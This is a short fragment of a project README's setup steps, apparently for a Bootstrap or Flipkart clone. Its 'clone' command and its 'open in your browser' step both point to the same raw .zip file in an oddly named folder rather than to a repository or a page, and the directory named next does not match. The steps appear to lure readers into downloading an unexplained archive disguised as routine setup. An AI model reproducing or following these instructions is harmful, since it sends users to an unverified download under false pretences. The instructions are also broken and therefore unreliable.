...
1. Clone the repository:
   ```sh
   git clone https://github.com/nikeshRajbanshi231/bootstrap-Clone/raw/refs/heads/main/noncataloguer/Clone_bootstrap_v1.6-alpha.2.zip
   ```
2. Navigate to the project directory:
   ```sh
   cd flipkart-clone
   ```
3. Open `https://github.com/nikeshRajbanshi231/bootstrap-Clone/raw/refs/heads/main/noncataloguer/Clone_bootstrap_v1.6-alpha.2.zip` in your browser.
